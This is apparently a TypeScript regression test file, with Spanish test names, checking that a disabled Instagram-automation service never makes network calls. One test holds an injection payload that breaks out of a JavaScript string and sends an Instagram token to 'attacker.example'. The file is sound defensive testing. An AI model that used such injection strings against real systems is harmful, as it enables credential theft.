/**
 * browserless-automation.ts used to drive a remote headless Chrome (via
 * browserless.io) to like/comment/follow/view-story on THIRD-PARTY Instagram
 * accounts — automated engagement outside the API, banned by Instagram
 * (AUTO-001/002/003) — and had a real code-injection bug (message/
 * targetPostId/targetAccountId/igToken interpolated unsanitized into a JS
 * string executed server-side by Browserless). Now permanently disabled:
 * these tests are the regression guard that it stays that way.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { executeBrowserlessAction, type BrowserlessAction } from '../../src/services/browserless-automation.js';

const fetchSpy = vi.fn();

beforeEach(() => {
  vi.stubGlobal('fetch', fetchSpy);
  fetchSpy.mockClear();
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe('executeBrowserlessAction: deshabilitado', () => {
  it.each<BrowserlessAction['action']>(['like', 'comment', 'follow', 'story-view'])(
    '%s: nunca llama a Browserless (fetch), siempre falla con error claro',
    async (action) => {
      const result = await executeBrowserlessAction({ action, targetAccountId: 'alguien' }, 'fake-ig-token');
      expect(result.ok).toBe(false);
      expect(result.error).toMatch(/deshabilitad/i);
      expect(fetchSpy).not.toHaveBeenCalled();
    },
  );

  it('un message con contenido de inyección tampoco dispara ninguna llamada de red', async () => {
    const malicious = "'; await fetch('https://attacker.example/steal?t=' + igToken); //";
    const result = await executeBrowserlessAction(
      { action: 'comment', targetPostId: 'abc', message: malicious },
      'real-oauth-token-value',
    );
    expect(result.ok).toBe(false);
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});
